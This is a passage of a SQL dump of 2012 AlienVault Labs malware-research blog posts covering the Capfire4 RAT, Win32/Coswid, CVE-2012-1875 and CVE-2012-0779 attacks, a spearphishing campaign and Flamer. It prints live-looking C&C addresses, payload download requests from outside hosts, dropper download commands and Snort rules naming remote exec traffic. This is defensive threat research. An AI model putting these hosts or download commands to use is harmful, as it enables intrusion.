Pedro Henriqueownerid: 401.407.278-92country: BRcreated: 20090510changed: 20100713Finally, once infected, you can easily manage your victims. You can perform remote control on the machine, password stealing, and command execution.      Uninstall software, Reboot, Logoff user, Kill process, Send DOS command, Download an execute file, Open web page.If you need to infect more targets, you will have to pay for them.  Malware communication with the C&C is done using HTTP. For command execution they use other protocol from port 9000.The C&C IP is from Brazil and always the same, which is included in our IP reputation database -> 174.142.93.226.    You can use the following rules to detect the communication traffic and command execution requests:alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:“MALWARE Capfire4 register machine”; flow:to_server,established; content:“GET”; depth:3; uricontent:”/registraMaquina”; content:“Host|3A| api|2E|capfire4|2E|com”; http_header; classtype:trojan-activity; sid:5000080; rev:1;)alert tcp $HOME_NET any -> $EXTERNAL_NET $HTTP_PORTS (msg:“MALWARE Capfire4 update machine status”; flow:to_server,established; content:“POST”; depth:4; uricontent:”/updMaqStatus”; content:“Host|3A| api|2E|capfire4|2E|com”; http_header; classtype:trojan-activity; sid:5000081; rev:1;)alert tcp $EXTERNAL_NET 9000 -> $HOME_NET any (msg:“MALWARE Capfire4 remote command execution”; flow:to_server,established; content:”|10|”; depth:1; content:”|14|”; distance:1; within:1; content:”.exe”; classtype:trojan-activity; sid:5000082; rev:1;)alert tcp $EXTERNAL_NET 9000 -> $HOME_NET any (msg:“MALWARE Capfire4 remote kill process”; flow:to_server,established; content:”|10|”; depth:1; content:”|14|taskkill”; distance:1; within:9; classtype:trojan-activity; sid:5000083; rev:1;)alert tcp $EXTERNAL_NET 9000 -> $HOME_NET any (msg:“MALWARE Capfire4 remote download and exec”; flow:to_server,established; content:”|10|”; depth:1; content:”|14|wget -c”; distance:1; within:8; classtype:trojan-activity; sid:5000084; rev:1;)As a conclusion, we can mention that the ease to use frameworks to monetize malware is getting more and more popular on the Internet as they let people without technical skills to easily manage their victims.', 'malwareratremote controlcapfire', '/blogs/labs-research/capfire4-malware-rat-software-and-cc-service-together');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (97, 'Win32/Coswid', 'Jaime Blasco', 'June 14, 2012 ', 'Continuing the research on the last spearphishing campaign we published yesterday,  we found that the same group is using another downloader named Win32/Coswid. The dropper is similar to the one we described in the previous report.The main difference is that instead of using an html file to hide the configuration, it gets the config values from a PNG file.Once running, the dropper will send a request to a remote server and will try to download the PNG file.We noted that the first part of the User-Agent header is the name of the computer running the dropper and the second part is a static string as seen in the code:This is useful to write an IDS signature based on the User-Agent. You can also find an anomaly on the Accept header (*/*,,,,,).The PNG file is a valid image:But if you open the file you will find something interesting at the end of that file:The dropper scans the file for content between “<!—” and “—!>” and performs a base64 decode. This version of the dropper supports only two commands:- s [sleep], example s:20- d [download], example: d:173.10.48.242 /html/AcroRd32.gifIf the dropper finds the download command, it will grab the file specified on the configuration entry. Then it will decrypt and execute it.There are IDS rules on both Snort Sourcefire and EmergingThreats Pro to cover the HTTP requests:1:22103 <-> ENABLED <-> BACKDOOR Win32.Coswid.klk runtime detection (backdoor.rules)2804876 - ETPRO TROJAN Win32/Coswid.A Checkin (trojan.rules)We have found several configuration files containing the following values:d:173.10.48.242/html/AcroRd32.gifd:66.109.23.156 /temp/smss.gifd:66.109.23.156 /images/update.gifd:65.105.157.28 /mama/winupdate.gifd:69.84.35.39 /netaphex/Acrod32.gifd:69.84.35.39 /netaphex/Acrod.gifd:69.84.35.39 /netaphex/update.gifd:69.84.35.39 /netaphex/google.gifd:yulepx.com /inc/update.gifMost of these payloads are the same trojan discussed in our previous analysis and also known as Trojan.Cookies.Some of the Coswid files we were able to find are:726ef24b8eff4c4121c73861756fb9a3a4ba6540520c375875bf46cf8e19cb7d09fd067b6d944bf111857f6f60b7471eb5cf509ec072aa281e5bdb1f7c7a36ea06cd694d383e4951e274878b975b5785eab862be60fdfe98ce415d38e41889bff791d1ad81601aac3e3d32a683189c06', 'malwareapttrojanwin32coswid', '/blogs/labs-research/win32-coswid');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (98, 'Ongoing attacks exploiting CVE-2012-1875', 'Jaime Blasco', 'June 13, 2012 ', 'Yesterday, Microsoft released the June 2012 Black Tuesday Update including patches for a vulnerability affecting a wide range versions of Internet Explorer. The exploit works across different Windows versions ranging from XP to Windows 7.The 0day has been actively exploited as reported by mcafee.We have been able to find several servers hosting similar versions of the exploit. One of them was detected by our OTX system a couple of days ago:https://otx.alienvault.com/indicator/ip/113.10.241.239/The exploit supports a wide range of languages and Windows versions and seems to be very reliable.The exploit includes return-oriented programming (ROP) techniques that helps bypassing OS protections.The shellcode downloads the payload from the following url:GET /javaw.exe HTTP/1.1Accept: */*Accept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.1)Host: 113.10.241.239Connection: Keep-Alivehttps://www.virustotal.com/file/705cf0c95f7f0d351d480df4b48f723c7f72ce4e16b14a3a52f99081707e5a32/analysis/A couple of days ago the AV detection rate was 3/41.Other versions of the exploit have been found in different servers requesting the following payloads:GET /english/cala.exe HTTP/1.1 Accept: */*Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.1)Host: 140.109.236.143Connection: Keep-AliveandGET /img/books.cab HTTP/1.1Accept: */*Accept-Encoding: gzip, deflateUser-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; InfoPath.1)Host: www.villagXXXXConnection: Keep-Alivehttps://www.virustotal.com/file/1581c0555956f7f62c717e303b6f8785207f107fbb4e375c1e50788d9a4a2f07/analysis/The payloads seems to be RAT (Remote Access Tools).The C&C server for that RAT is online (ip address 219.90.117.132)219.90.117.128 - 219.90.117.159China Shenzhen Soul Tech Co. LtdWe will release more information as soon as we analyze the components involved on this attack.', 'malwareaptratmicrosoftcve-2012-1875', '/blogs/labs-research/ongoing-attacks-exploiting-cve-2012-1875');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (99, 'Unveiling a spearphishing campaign and possible ramifications', 'Jaime Blasco', 'June 12, 2012 ', 'A few days ago, DigitalBond published information about an ongoing spearphishing campaign that affected one of their employees.The attackers were using a pdf document related to ICS (Industrial Control Systems) security as a lure to compromise potential targets within the ICS community.After analyzing the initial information provided, my friend Rubén Santamarta from IOActive and I investigated further on the binaries and the involved infrastructure.Analysis of the malwareAs described in this analysis done by the DigitalBond folks, the mail contained a link to a zip file hosted on hxxp://research.digitalvortex.com/Once uncompressed, the file Leveraging_Ethernet_Card_Vulnerabilities_in_Field_Devices.pdf.exe (c6b95b178188b8c35d14bed40520e685)https://www.virustotal.com/file/883b274e5f79f47e5d75afa940eb0c99d4a77526137cbc9a0af1581875e99b0d/analysis/The file is a WinRAR SFX archive that will unpack the malware files to the user’s Temp folder as well as showing the benign PDF file Lev​era​gin​g_E​the​rne​t_C​ard​_Vu​lne​rab​ili​tie​s_i​n_F​iel​d_D​evi​ces​.pd​f.C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\spoolsvr.exe (md5: 5ff3269faca4a67d1a4c537154aaad4b)C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\Leveraging_Ethernet_Card_Vulnerabilities_in_Field_Devices.pdfThe dropped file spoolsvr.exe,https://www.virustotal.com/file/466bb7da773c7c200f87a8a06f143c6c6856e9ebc4347eb4afb096104bcd97b4/analysis/ The malware also creates a registry key to maintain persistence:HKEY_USERS\\Software\\Microsoft\\Windows\\CurrentVersion\\Runload = C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\spoolsvr.exeThe file is a downloader that reads the configuration file from a remote server, in this case:hxxp://hint.happyforever.com/logo.html203.231.234.23203.226.0.0 - 203.231.255.255KRNICKorea Network Information CenterAs described in the DigitalBond’s analysis, the html file contains configuration values within the html tags. The config values are encoded with base64 and then XORED with the key 0x42.In this file, the values are as follow:<head>download:;sleep:20;</head><title>tanghl.exe</title>and the body contains a PE File with a new malware.You can use a small script I created to automatically extract http://alienvault-labs-garage.googlecode.com/files/parse_html_content.py [no longer available] the config values and the binary file from the html content giving the XOR key used. Example:$ python parse_html_content.py logo.html 42download:;sleep:20;tanghl.exeBinary file logo.html.exe savedThe downloaded file tanghl.exe, is only detected by 3 AV engines:https://www.virustotal.com/file/0eb7590c2188d995fb3f8394ee10db5856542cfac3a62fd3c8e54236f5ffd428/analysis/This file is a RAT (Remote Access Tool) known as Backdoor:Win32/Dalbot.genThis particulary sample connects to the C&C server 1.234.1.681.224.0.0 - 1.255.255.255SK Broadband Co LtdJung-gu SK NamsanGreen Bldg,Namdaemunno 5(o)-ga, SeoulThe communication between the malware and the C&C is done using HTTP requests to random numeric .asp files  . The RAT communication is present on the Cookie header of the request and base64/xor encoded.GET /8223.asp HTTP/1.1Accept: */*User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)Host: 1.234.1.68Connection: Keep-AliveCookie: CAQGBgoFD1YaHA4ZH1AIBwIOBR8ADhJWU1pcXlADBBgfBQoGDlYDCgUeDgcORgkIXVtcWVtQIf we decode the value of the Cookie header (decode base64 and XOR and 1 byte XOR 0x6b) we can see the actual checkin:command=qwert;clientkey=8175;hostname=XXXXXX;Further investigations of the campaignUsing the information extracted from the binaries and the servers involved on the attack, we were able to identified more files and campaigns launched by this group during the last months.The following binary (Romneys_Partner_Choice.exe, md5: 6306364c58f31a711c410c9a874f103c) downloads the config file from:hxxp://update.slowblog.com/images/logo.pngThe server update.slowblog.com was pointing to the same ip as hint.happyforever.com (203.231.234.23) and drops the following benign PDF file, Romneys_Partner_Choice.pdf.Another file is f77852b73dfde33ea248df7087671f53 that downloads the config file fromhttpx://report.rawcomp.com/images/wait.png that also points to 203.231.234.23and drops China’s_Rare-Earth_Industry.pdf.Looking for other binaries connecting to the C&C ip address 1.234.1.68 we found the following:53ae642408aaf6cfed016422b394b32a whose filename is the_list_of_staff_changes_in_anakam.exeIt downloads the config file fromhxxp://report.crabdance.com/report/news.html210.249.80.141210.248.0.0 - 210.255.255.255Japan Network Information CenterThe following files were getting the config file from the same server (report.crabdance.com):MD5 (New_Chertoff_Group_Q1_2012_Report.zip) = e7b5596a08bda3592ed3978ef8d5bcddMD5 (Speeches_For_IT-SCC_Meeting.zip) = 094c72273d716302705218eea8b7829eMD5 (Staff_Changes(URI).zip) = 6725ea60e45b85a63e0dd35f50b50a24MD5 (Staff_Changes(cmu).zip) = cae33614eb014ed50ab5e1381547bd4aMD5 (Staff_Changes(purdue).zip) = f108cacaaae8295d9fc602c51bef59cfMD5 (New_NJVC_First_Half_2012_Report.zip) = 8f26609c275e0262b4833ccc7909779cdropping the following exes:MD5 (New NJVC First Half 2012 Report.exe) = f7aa931de0564f77b27c2f5d1d9bc532MD5 (Any_Staff_Changes_About_Carnegie_Mellon_University.exe) = 8873f6d3ea123708615e72fe357808e5MD5 (Any_Staff_Changes_About_Purdue_University.exe) = 8873f6d3ea123708615e72fe357808e5MD5 (Any_Staff_Changes_About_University_of_Rhode_Island.exe) = 8873f6d3ea123708615e72fe357808e5MD5 (New_Chertoff_Group_Q1_2012_Report.exe) = 59e74b14f5edee8d38eba74a8000fb18MD5 (Speeches_For_IT-SCC_Meeting.exe) = 59e74b14f5edee8d38eba74a8000fb18This downloaders obtain the config file fromhxxp://report.crabdance.com/report/news.htmlhxxp://203.200.205.245/java/careers.htmlhxxp://203.200.205.245/css/style.htmlAll of them obtain the same RAT and the following C&C ip addresses were present on the binaries:1.234.1.68:80143.89.35.7:80143.89.0.0 - 143.89.255.255Hong Kong University of Science and Technology128.175.21.189:80sql1.be.udel.edu (128.175.21.189)128.175.0.0 - 128.175.255.255Information Technologies192 South Chapel StreetNewark, DEUSMore binaries were found connecting to the ip address 128.175.21.189:1d8ff16257181562aec3a74ca79ce092 that drops the following doc file:DRAFT_NEMA_Welcomes_Congressional_Approval_of_Legislation_Directing_DOT_to_Harmonize_with_International_Standards.docand gets the config file from release.pornandpot.com (128.175.21.189)a8b2ac446c614fd5d4880d95369deb3bhxxp://www.doversolutions.co.in/images/title.png (203.200.205.245)81848edc70fa647789d78c1610b93135hxp://203.200.205.245/images/title.png (203.200.205.245)8e3210d90e728cad7691a4ada11568a0hxp://203.200.205.245/images/title.png (203.200.205.245)c12699e9ff4e150c10bcbd62219f2af6hxxp://203.200.205.245/images/google.pnghxxp://173.10.48.242/html/WINWORD.gif and use 74.93.92.50 as the C&C server. 9a4cf6b89ce11566f7048223fb8cf638hxxp://203.200.205.245/postinfo.html36fec0bf34b49c09ec8d6cf12205953chttp://203.200.205.245/default.htmOther files connecting to the C&C server  74.93.92.50:013649078c6498d27aa37ac8a739b20f0e087ef59f698c7807e268759a3bbc71 Using the script to extract the information from the html config files, we found the following different configuration values: sleep:122;AcroRd32.exedownload:;AcroRd32.exedownload:;sleep:20;tanghl.exesleep:240;Windows.exedownload:;AcroRd32.exesleep:124;ntdll.exesleep:20;AcroRd32.exedownload:;WINWORD.EXEsleep:20;WINWORD.EXEFinal notesWe have identified that the group behind these attacks is using hacked web servers to host the malicious configuration files. Based on the networks hosting the C&C ips (mainly universities), it is very likely that these servers are also hacked and some kind of proxy is installed on them to redirect the traffic to the real C&C server. This can be easily achieve using HTran or other similar software commonly used by Chinese hacker groups in this kind of campaigns.If we take a look at the name of the identified files, we can build a short list of likely targets and/or their customers:- Universities (Carnegie Mellon, Purdue University, Rhode Island)- ICS related organizations (DigitalBond, NEMA [National Electrical Manufacturers Association])- Government contractors (NJVC, Chertoff Group)- Two-Factor Authentication technology (Anakam).The usage of configuration values inside HTML content is somehow similar to what attackers used during the Operation Shady RAT.Apart from the modus operandi, we identified the C&C server 74.93.92.50. Based on the information provided on the following links:http://www.secureworks.com/research/threats/htran/http://pastebin.com/yKSQd5Z5It seems that ip is somehow related to the group behind the RSA breach.If you remember, a month ago, the ICS-CERT published a note warning on a series of cyber intrusions targeting natural gas pipeline companies. Some days after that, information about a link between this attacks and the RSA breach was published. “The indicators DHS provided to hunt for the gas-pipeline attackers included several that, when we checked them, turned out to be related to those used by the perpetrators of the RSA attack,”  you can read on the article.One way or another, it seems that ICS companies are beginning to be included in the shopping list of these kind of groups.You can also use the following OpenIOC file http://alienvault-labs-garage.googlecode.com/files/d3b52fea-5020-469c-97f8-b23bf4954751.ioc [no longer available] that contains the indicators of compromise related to the data presented: You can find more information  at  IOActive blog', 'spearphishingwin32dalbot.gendigitalbond', '/blogs/labs-research/unveiling-a-spearphishing-campaign-and-possible-ramifications');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (100, 'Flamer Indicators Of Compromise (OpenIOC)', 'Jaime Blasco', 'June 4, 2012 ', 'Since CrySyS Lab and Kaspersky disclosed the existence of a new malware called Flamer, everyone has been analyzing and discovering new information about its behavior.We will try to summarize some of the Indicators Of Compromise (IOCs) that we can use to detect the presence of the Flamer framework using OpenIOC. Created by Mandiant, OpenIOC is an extensible XML schema that enables you to describe the technical characteristics that identify a known threat, an attacker’s methodology, or other evidence of compromise.It has a very flexible schema and thanks to it we can describe every component of an attack/compromise. We will try to include most of the indicators which will detect the presence of Flamer. Note that OpenIOC is new for me so if someone wants to comment and add value to the IOC feel free to do it.Mandiant released a graphical tool called IOC Editor that allows creating and editing IOCs. I often use that tool and some Python scripting when working with large IOCs.We will first include some IOCs describing the registry changes that Flame performs on a compromised machine. It includes the addition of the DLL mssecmgr.ocx on HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\Autenthication that Flamer uses to maintain persistence. The other registry modifications are related to the Audio driver.Then we can easily include the different mutexes created by the Flamer components during execution (I updated my list with some information published by FireEye)The next step is including the list of files belonging to Flame and his components:And the associated domains: Lets add the export functions of some of the modules used by the framework: You can download the file containing all the IOCs here http://alienvault-labs-garage.googlecode.com/files/af2e8c80-13db-4a57-99ac-460ccd192333.ioc [no longer available].To look for the IOCs we just wrote, you can use the tool IOCFinder, first you have to collect the information required to perform the checks:C:\\>mandiant_ioc_finder.exe collect -o e:\\flamer\\iocs\\ -d c:06-04-2012 14:32:27 Setting up dependencies…06-04-2012 14:32:27 Starting collection…06-04-2012 14:32:27 Running built-in collection script at ./lib/script.xml…06-04-2012 14:32:27 Auditing (w32system) started at 06-04-2012 14:32:2706-04-2012 14:32:27 Auditing (w32system) finished. (Took 0.11 seconds)06-04-2012 14:32:27 Auditing (w32disks) started at 06-04-2012 14:32:27....And then look for the IOCs:C:\\>mandiant_ioc_finder.exe report -s e:\\flamer\\iocs\\ -i c:\\iocs\\ -t doc -w verbose06-04-2012 23:08:12 Loading *.ioc from=c:\\iocs\\06-04-2012 23:08:12 1 iocs were loaded.06-04-2012 23:08:13 No Word Doc XML output path selected. Using report_20120604210812.doc.xml.06-04-2012 23:08:13 Beginning search of audit bundle at path=e:\\flamer\\iocs\\XXXXX\\20120604180114 (1 of 1). Total size=708.88 MB.', 'openiocflameskywiperflamer', '/blogs/labs-research/flamer-indicators-of-compromise-openioc');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (101, 'How old is Flame?', 'Jaime Blasco', 'May 30, 2012 ', 'As every of you probably know, yesterday Crysys revealed a new threat called Skywiper and also Flame or Flamer. There are rumors that the threat has been out there for a couple of years. Based on our investigations, we have found clues that points to different components related with Flame that has been around for nearly four years. The main component of the threat published by Crysys is a file called mssecmgr.ocx (md5:bdc9e04388bda8527b398a8c34667e18) It is clear that the file timestamp has been changed and it points to 20/02/1992. But  the PE file has some debug info entries that points to 31/08/2011.The timestamp of the Export section also has the same value:The original main module exports the following functions: CPlApplet, DDEInit, DDEnumCallback, GetAuthMechanism, InprocServer, QueryValueEx, SetAuthMechanism, SetEnumStructure, ValueEnumCallback We have found another mssecmgr.ocx file (md5:ee4b589a7b5d56ada10d9a15f81dada9)  that seems to be much older. It exports less functions than the newer mssecmgr.ocx: CPlApplet, DDEnumCallback, InprocServer, SetAuthMechanism, ValueEnumCallback If we take a look at the PE headers it seems that it was compiled at the end of 2008:First seen by VirusTotal 2009-07-29 08:45:52 UTC ( 2 years, 10 months ago ) (3 years old) If we explore the published advnetcfg.ocx file that is the backdoor component (md5: bb5441af1e1741fca600e9c433cb1550) we check that the PE file timestamp has been modified but we find some debug info that points to the beginning of 2011:And the export sections seems to indicate the same:First seen by VirusTotal 2011-05-15 04:31:30 UTC ( 1 year ago ) In the case of nteps32.ocx (md5: c9e00c9d94d1a790d5923b050b0bd741) that is the component is charge of performing screen captures and other spy related routines, the dates match with the ones of the advnetcfg.ocx component: Based on the original analysis done by Crysys http://www.crysys.hu/skywiper/skywiper.pdf it seems to be a routines called SUICIDE that removes all the files related to Flame:SUICIDE.RESIDUAL_FILES.A [NoValue]->%temp%\\~a28.tmpSUICIDE.RESIDUAL_FILES.B [NoValue]->%temp%\\~DFL542.tmpSUICIDE.RESIDUAL_FILES.C [NoValue]->%temp%\\~DFL543.tmpSUICIDE.RESIDUAL_FILES.D [NoValue]->%temp%\\~DFL544.tmpSUICIDE.RESIDUAL_FILES.E [NoValue]->%temp%\\~DFL545.tmpSUICIDE.RESIDUAL_FILES.F [NoValue]->%temp%\\~DFL546.tmpSUICIDE.RESIDUAL_FILES.G [NoValue]->%temp%\\~dra51.tmpSUICIDE.RESIDUAL_FILES.H [NoValue]->%temp%\\~dra52.tmpSUICIDE.RESIDUAL_FILES.I [NoValue]->%temp%\\~fghz.tmpSUICIDE.RESIDUAL_FILES.J [NoValue]->%temp%\\~rei524.tmpSUICIDE.RESIDUAL_FILES.K [NoValue]->%temp%\\~rei525.tmpSUICIDE.RESIDUAL_FILES.L [NoValue]->%temp%\\~TFL848.tmpSUICIDE.RESIDUAL_FILES.M [NoValue]->%temp%\\~TFL842.tmpSUICIDE.RESIDUAL_FILES.O [NoValue]->%temp%\\GRb2M2.batSUICIDE.RESIDUAL_FILES.P [NoValue]->%temp%\\indsvc32.ocxSUICIDE.RESIDUAL_FILES.Q [NoValue]->%temp%\\scaud32.exeSUICIDE.RESIDUAL_FILES.R [NoValue]->%temp%\\scsec32.exeSUICIDE.RESIDUAL_FILES.S [NoValue]->%temp%\\sdclt32.exeSUICIDE.RESIDUAL_FILES.T [NoValue]->%temp%\\sstab.datSUICIDE.RESIDUAL_FILES.U [NoValue]->%temp%\\sstab15.datSUICIDE.RESIDUAL_FILES.V [NoValue]->%temp%\\winrt32.dllSUICIDE.RESIDUAL_FILES.W [NoValue]->%temp%\\winrt32.ocxSUICIDE.RESIDUAL_FILES.X [NoValue]->%temp%\\wpab32.batSUICIDE.RESIDUAL_FILES.T [NoValue]->%windir%\\system32\\commgr32.dllSUICIDE.RESIDUAL_FILES.A1 [NoValue]->%windir%\\system32\\comspol32.dllSUICIDE.RESIDUAL_FILES.A2 [NoValue]->%windir%\\system32\\comspol32.ocxSUICIDE.RESIDUAL_FILES.A3 [NoValue]->%windir%\\system32\\indsvc32.dllSUICIDE.RESIDUAL_FILES.A4 [NoValue]->%windir%\\system32\\indsvc32.ocxSUICIDE.RESIDUAL_FILES.A5 [NoValue]->%windir%\\system32\\modevga.comSUICIDE.RESIDUAL_FILES.A6 [NoValue]->%windir%\\system32\\mssui.drvSUICIDE.RESIDUAL_FILES.A7 [NoValue]->%windir%\\system32\\scaud32.exeSUICIDE.RESIDUAL_FILES.A8 [NoValue]->%windir%\\system32\\sdclt32.exeSUICIDE.RESIDUAL_FILES.A2 [NoValue]->%windir%\\system32\\watchxb.sysSUICIDE.RESIDUAL_FILES.A10 [NoValue]->%windir%\\system32\\winconf32.ocxSUICIDE.RESIDUAL_FILES.A11 [NoValue]->%windir%\\system32\\mssvc32.ocxSUICIDE.RESIDUAL_FILES.A12 [NoValue]->%COMMONPROGRAMFILES%\\MicrosoftShared\\MSSecurityMgr\\rccache.datSUICIDE.RESIDUAL_FILES.A13 [NoValue]->%COMMONPROGRAMFILES%\\MicrosoftShared\\MSSecurityMgr\\dstrlog.datSUICIDE.RESIDUAL_FILES.A14 [NoValue]->%COMMONPROGRAMFILES%\\MicrosoftShared\\MSAudio\\dstrlog.datSUICIDE.RESIDUAL_FILES.A15 [NoValue]->%COMMONPROGRAMFILES%\\MicrosoftShared\\MSSecurityMgr\\dstrlogh.datSUICIDE.RESIDUAL_FILES.A16 [NoValue]->%COMMONPROGRAMFILES%\\MicrosoftShared\\MSAudio\\dstrlogh.datSUICIDE.RESIDUAL_FILES.A17 [NoValue]->%SYSTEMROOT%\\Temp\\~8C5FF6C.tmpSUICIDE.RESIDUAL_FILES.A18 [NoValue]->%windir%\\system32\\sstab0.datSUICIDE.RESIDUAL_FILES.A12 [NoValue]->%windir%\\system32\\sstab1.datSUICIDE.RESIDUAL_FILES.A20 [NoValue]->%windir%\\system32\\sstab2.datSUICIDE.RESIDUAL_FILES.A21 [NoValue]->%windir%\\system32\\sstab3.datSUICIDE.RESIDUAL_FILES.A22 [NoValue]->%windir%\\system32\\sstab4.datSUICIDE.RESIDUAL_FILES.A23 [NoValue]->%windir%\\system32\\sstab5.datSUICIDE.RESIDUAL_FILES.A24 [NoValue]->%windir%\\system32\\sstab6.datSUICIDE.RESIDUAL_FILES.A25 [NoValue]->%windir%\\system32\\sstab7.datSUICIDE.RESIDUAL_FILES.A26 [NoValue]->%windir%\\system32\\sstab8.datSUICIDE.RESIDUAL_FILES.A27 [NoValue]->%windir%\\system32\\sstab2.datSUICIDE.RESIDUAL_FILES.A28 [NoValue]->%windir%\\system32\\sstab10.datSUICIDE.RESIDUAL_FILES.A22 [NoValue]->%windir%\\system32\\sstab.datSUICIDE.RESIDUAL_FILES.B1 [NoValue]->%temp%\\~HLV751.tmpSUICIDE.RESIDUAL_FILES.B2 [NoValue]->%temp%\\~KWI288.tmpSUICIDE.RESIDUAL_FILES.B3 [NoValue]->%temp%\\~KWI282.tmpSUICIDE.RESIDUAL_FILES.B4 [NoValue]->%temp%\\~HLV084.tmpSUICIDE.RESIDUAL_FILES.B5 [NoValue]->%temp%\\~HLV224.tmpSUICIDE.RESIDUAL_FILES.B6 [NoValue]->%temp%\\~HLV227.tmpSUICIDE.RESIDUAL_FILES.B7 [NoValue]->%temp%\\~HLV473.tmpSUICIDE.RESIDUAL_FILES.B8 [NoValue]->%windir%\\system32\\nteps32.ocxSUICIDE.RESIDUAL_FILES.B2 [NoValue]->%windir%\\system32\\advnetcfg.ocxSUICIDE.RESIDUAL_FILES.B10 [NoValue]->%windir%\\system32\\ccalc32.sysSUICIDE.RESIDUAL_FILES.B11 [NoValue]->%windir%\\system32\\boot32drv.sysSUICIDE.RESIDUAL_FILES.B12 [NoValue]->%windir%\\system32\\rpcnc.datSUICIDE.RESIDUAL_FILES.B13 [NoValue]->%windir%\\system32\\soapr32.ocxSUICIDE.RESIDUAL_FILES.B14 [NoValue]->%windir%\\system32\\ntaps.datSUICIDE.RESIDUAL_FILES.B15 [NoValue]->%windir%\\system32\\advpck.datSUICIDE.RESIDUAL_FILES.B16 [NoValue]->%temp%\\~rf288.tmpSUICIDE.RESIDUAL_FILES.B17 [NoValue]->%temp%\\~dra53.tmpSUICIDE.RESIDUAL_FILES.B18 [NoValue]->%systemroot%\\system32\\msglu32.ocxSUICIDE.RESIDUAL_FILES.C1 [NoValue]->%COMMONPROGRAMFILES%\\MicrosoftShared\\MSAuthCtrl\\authcfg.datSUICIDE.RESIDUAL_FILES.C2 [NoValue]->%COMMONPROGRAMFILES%\\MicrosoftShared\\MSSndMix\\mixercfg.datBased on this info we could find some of the files that has been part of Flame on the past. We found a version of comspol32.ocx (md5: 20732c97ef66dd97389e219fc0182cb5) that was first seen on VirusTotal nearly two years ago: 2010-07-20 13:41:34 UTC ( 1 year, 10 months ago ) The Export sections headers indicates that it has been compiled at the end of 2009:The dll exports the following functions: CreateDTIList, CreateRTAList, DisableRSG, DisableRSO, DisableRSOEx, DisableRTA, EnableRSG, EnableRSO, EnableRSOEx, EnableRSOExDefault, EnableRTA, FreeDTIData, GetDRI, GetDTI, ReadDTIData, RestoreDTIData, UpdateDTIList, WriteDTIData At the time of uploading to VirusTotal it was only detected by Microsoft as Trojan:Win32/Tosy.A.   Another discovered file is dsmgr.dll (md5: 2afaab2840e4ba6af0e5fa744cd8f41f) that exports the following functions: CreateDSPList, DisableDSP, EnableDSP It was uploaded to VirusTotal more than three years ago: First seen by VirusTotal 2009-05-21 03:01:33 UTC ( 3 years ago ) And the Export sections headers indicate it was compiled about the middle of 2008 (4 years ago)At the time of upload to VirusTotal it was detected by five antivirus vendors with generic signatures (not very realiable). The file indsvc32.dll (md5:7a2eded2c5d8bd70e1036fb5f81c82d2) exports the following functions: QDInit, SetObjectDescriptor It was first uploaded on: First seen by VirusTotal 2009-12-22 09:27:31 UTC ( 2 years, 5 months ago ) And the Export headers points to the end of 2009:It was detected by three antivirus vendors at the time of uploading to VirusTotal. Another version of  indsvc32.dll (md5:6f7325bb482885e8b85acddec685f7fa) was uploaded more or less at the same time as the other version: First seen by VirusTotal 2009-12-22 08:36:23 UTC ( 2 years, 5 months ago ) And the Export timestamps point more or less to the same time:Based on this information we can state:- We have found a version of the main component (mssecmgr.ocx) that seems to be compiled at the end of 2008. It can indicate that Flame has been around at least for 4 years.- Some of the components of Flame are detected by antivirus companies as other names, this can indicate that the authors are using older code/binaries or maybe some of the components were already discovered by antivirus companies.- There must be other undiscovered modules with other features that security companies will detect on the upcoming days.We will continue analyzing Flame and trying to present more clues on the capabilities of Flame and who is behind of it.', 'flameskywiperflamer', '/blogs/labs-research/how-old-is-flame');
INSERT INTO `AlientVault` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (102, 'Several Targeted Attacks exploiting Adobe Flash Player (CVE-2012-0779)', 'Jaime Blasco', 'May 6, 2012 ', 'A couple of days ago, Adobe issued a security update for Adobe Flash Player that has been detected in the wild targeting specific objectives.Several spear phishing campaigns have been detected. The mails sent contain a Word document attachment. It contains a reference to a Flash file that is downloaded from a remote server once the document is opened. This Flash file exploits the CVE-2012-0779 vulnerability triggering a shellcode that looks for the payload within the original word document. The payload is decoded using a one byte XOR scheme, dropped on the system and then executed.Most of the malicious Flash files have low AV detection rates so it is very important to apply the vendor’s patch.\nWe have seen several documents sent to a wide range of industries as well as Tibet related NGO’s. Some examples are:Once the victim opens the document, the malicious Flash file is downloaded from a remote server:In the vast majority of the documents we have analyzed, the malicious files are hosted on hacked websites.We will release more information as well as IDS signatures to detect some of the payloads we have seen so far.', 'apttargeted attackscve-2012-0779', '/blogs/labs-research/several-targeted-attacks-exploiting-adobe-flash-player-cve-2012-0779');
